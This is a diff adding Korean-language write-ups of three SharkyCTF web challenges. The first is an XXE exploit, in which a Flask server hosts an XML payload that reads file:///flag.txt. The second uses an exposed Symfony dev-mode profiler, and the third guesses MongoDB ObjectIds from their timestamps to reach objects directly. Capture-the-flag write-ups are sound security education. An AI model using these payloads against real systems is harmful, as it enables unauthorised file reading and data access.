@@ -25,6 +25,10 @@
 
 [Web](#web-3)
 
+- [XXExternalXX](#xxexternalxx70)
+- [Logs In ! Part 1](#logs-in--part-1155)
+- [Containment Forever](#containment-forever266)
+
 전체적으로 플래그를 **절대** 게싱하지 못하는 문제였다. 길기도 하고 해시가 들어 있었다..ㄷ
 
 출제자 write-up은 [여기](https://gitlab.com/Nofix/sharkyctf/)서 보실 수 있습니다.
@@ -306,3 +310,95 @@ for i in range(23):
 :\
 
 ## Web (3)
+
+### XXExternalXX(70)
+
+문제 제목부터 XXE라고 강조를 하고 있다.
+Show stored data를 누르면 News를 보여주는데
+Uri가 `http://xxexternalxx.sharkyctf.xyz/?xml=data.xml`인 것으로 보아
+xml파일을 넘겨주면 될 것 같다
+xml을 비워두면 에러 메시지가 그대로 출력 되는데
+file_get_contents를 사용하고 있다.
+
+혹시나 해서 requestbin을 만들어 넣어봤더니 GET요청이 왔다.
+
+그래서 바로 xml코드를 짰다. 그런데 여기서 봐야할 것은 파일 구조인데, 이것은
+`http://xxexternalxx.sharkyctf.xyz/data.xml`로 들어가면 data.xml파일 구조가 보이기 때문에
+그대로 따라 적으면 된다.
+
+```py
+from flask import Flask
+
+app = Flask(__name__)
+
+payload = """<!DOCTYPE data[
+<!ENTITY xxe SYSTEM "file:///flag.txt">
+]>
+<root>
+<data>
+&xxe;
+</data>
+</root>
+
+"""
+
+
+@app.route("/")
+def index():
+    return payload
+
+
+app.run("0.0.0.0", 3000)
+```
+
+> shkCTF{G3T_XX3D_f5ba4f9f9c9e0f41dd9df266b391447a}
+
+### Logs In ! Part 1(155)
+
+symfony가 development모드로 돌아가고 있어서 노출이 된다.
+
+symfony로 들어가서 Last 10을 클릭하면 이상한 endpoint가 찍혀있다.
+
+그곳으로 이동하면 플래그가 보인다.
+
+![logs in](Web/logs.png)
+![logs in flag](Web/logs%20in.png)
+
+> shkCTF{0h_N0_Y0U_H4V3_4N_0P3N_SYNF0NY_D3V_M0D3_1787a60ce7970e2273f7df8d11618475}
+
+### Containment Forever(266)
+
+Confinement와 Flag를 클릭하면 리스트를 볼 수 있다.
+![confinement](Web/confinement.png)
+![flag](Web/flag.png)
+
+여기서 ObjectId라는 것은 MongoDB에서 할당되는 Unique한 id라고 보면 된다.
+각각의 Details를 클릭하면 아래와 같은 주소로 이동하고, Flag의 id를 얻어내면 될 것으로 보인다.
+
+http://containment-forever.sharkyctf.xyz/item/5e70da94d7b1600013655bb5
+
+자동으로 생성되는 ObjectId는 완전한 랜덤 값이 아니라서 충분히 맞출 수 있는 구조이다.
+
+https://docs.mongodb.com/manual/reference/method/ObjectId/\
+여기를 보면 알 수 있듯이 ObjectId는 timestamp, 랜덤값, 증가 값으로 이루어져있다.
+
+랜덤값은 증가 값이 다 차지 않는 이상 바뀌지 않는 것으로 알고 있다.
+따라서 위 사진에 올라온 날짜와 시각이 다 나와 있어서 이를 바탕으로 만들 수 있다.
+
+아무것도 없이 파이썬에서 timestamp를 계산하려면 우리나라가 UTC+9 이므로
+나와있는 숫자에서 9를 더해주어서 구한다. (아니면 다른 방법을 써도 된다)
+
+```py
+>>> hex(int(time.mktime(datetime.strptime("2020-03-21 18:13:22", "%Y-%m-%d %H:%M:%S").timetuple())))
+'0x5e75dab2'
+
+>>> hex(int(time.mktime(datetime.strptime("2020-04-14 00:50:18", "%Y-%m-%d %H:%M:%S").timetuple())))
+'0x5e948a3a'
+```
+
+위에서 timestamp를 제외한 부분에는 d7b1600013655bb5 ~ d까지 나와있으니깐
+적당히 앞뒤를 바꿔가면서 손루트 포싱 해주면 된다.
+
+그 결과 ObjectId는 `5e75dab2d7b1600013655bb8`, `5e948a3ad7b1600013655bbf`였다.
+
+> shkCTF{IDOR_IS_ALS0_P0SSIBLE_W1TH_CUST0M_ID!\_f878b1c38e20617a8fbd20d97524a515}
